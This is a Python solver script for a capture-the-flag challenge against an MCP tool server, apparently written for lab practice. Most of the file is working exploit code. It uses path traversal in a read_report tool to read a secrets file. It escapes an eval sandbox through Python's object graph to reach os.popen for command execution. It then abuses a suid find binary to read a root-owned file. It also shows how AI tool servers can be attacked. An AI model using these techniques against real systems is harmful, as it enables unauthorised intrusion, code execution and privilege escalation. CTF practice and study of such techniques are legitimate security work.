#!/usr/bin/env python3
"""
referee_briefing full solver — two flags via MCP exploitation.

Chain:
  Flag 1 (user):  read_report tool has no path sanitisation →
                  path-traversal from /app/reports/ up to /app/secrets/
  Flag 2 (root):  match_stats tool runs eval() with cleared
                  __builtins__ — classic sandbox escape via
                  ().__class__.__mro__ to reach os.popen, then pivot
                  from `referee` → root via the suid `/usr/bin/find`
                  GTFOBins trick.

Usage:
    python3 solve.py [host [port]]
"""

from __future__ import annotations

import itertools
import json
import sys
import urllib.request

_ID = itertools.count(1)


def rpc(host: str, port: int, method: str, params: dict | None = None) -> dict:
    payload = {
        "jsonrpc": "2.0",
        "id": next(_ID),
        "method": method,
        "params": params or {},
    }
    req = urllib.request.Request(
        f"http://{host}:{port}/mcp",
        data=json.dumps(payload).encode("utf-8"),
        headers={"Content-Type": "application/json"},
    )
    with urllib.request.urlopen(req, timeout=15) as resp:
        body = json.loads(resp.read().decode("utf-8"))
    if "error" in body:
        raise SystemExit(f"[-] rpc error: {body['error']}")
    return body["result"]


def call_tool(host: str, port: int, name: str, args: dict) -> str:
    res = rpc(host, port, "tools/call", {"name": name, "arguments": args})
    parts = [c.get("text", "") for c in res.get("content", []) if c.get("type") == "text"]
    return "\n".join(parts)


def flag_one(host: str, port: int) -> str:
    # read_report does f"/app/reports/{name}" — no sanitisation, so any
    # relative path that escapes /app/reports/ just works.
    return call_tool(host, port, "read_report", {
        "name": "../secrets/user_flag.txt",
    }).strip()


def flag_two(host: str, port: int) -> str:
    # match_stats runs `eval(expr, {"__builtins__": {}}, MATCH_METRICS)`.
    # Clearing __builtins__ blocks the bare names print/open/__import__
    # — but class literals are still reachable through Python's object
    # graph. Start at a tuple literal `()` (no name lookup), walk up
    # the MRO to `object`, enumerate its subclasses, and locate
    # `os._wrap_close` (registered as soon as `os` is imported, which
    # server.py does). Its `__init__.__globals__` closes over the `os`
    # module, which gives us `os.popen` without ever naming it.
    #
    # With RCE as `referee`, /usr/bin/find has the suid bit set
    # (GTFOBins classic), so `find . -exec cat /root/root_flag.txt ;`
    # reads the root flag because cat inherits EUID=0 from find.
    cmd = "/usr/bin/find /tmp -maxdepth 0 -exec /bin/cat /root/root_flag.txt ;"
    expression = (
        "[c for c in ().__class__.__mro__[-1].__subclasses__()"
        " if c.__name__ == '_wrap_close'][0].__init__.__globals__['popen']"
        f"({cmd!r}).read()"
    )
    result = call_tool(host, port, "match_stats", {"expression": expression})
    if result.startswith("result = "):
        result = result[len("result = "):]
    return result.strip().strip("'\"").strip()


def main() -> int:
    host = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 8008

    print(f"[*] target: http://{host}:{port}/mcp")

    info = rpc(host, port, "initialize", {})
    print(f"[+] server: {info['serverInfo']['name']} v{info['serverInfo']['version']}")

    tools = rpc(host, port, "tools/list", {})
    names = [t["name"] for t in tools["tools"]]
    print(f"[+] tools: {', '.join(names)}")

    print("[*] stage 1 — path traversal in read_report")
    f1 = flag_one(host, port)
    print(f"[+] flag 1 (user): {f1}")

    print("[*] stage 2 — eval sandbox escape + suid find")
    f2 = flag_two(host, port)
    print(f"[+] flag 2 (root): {f2}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
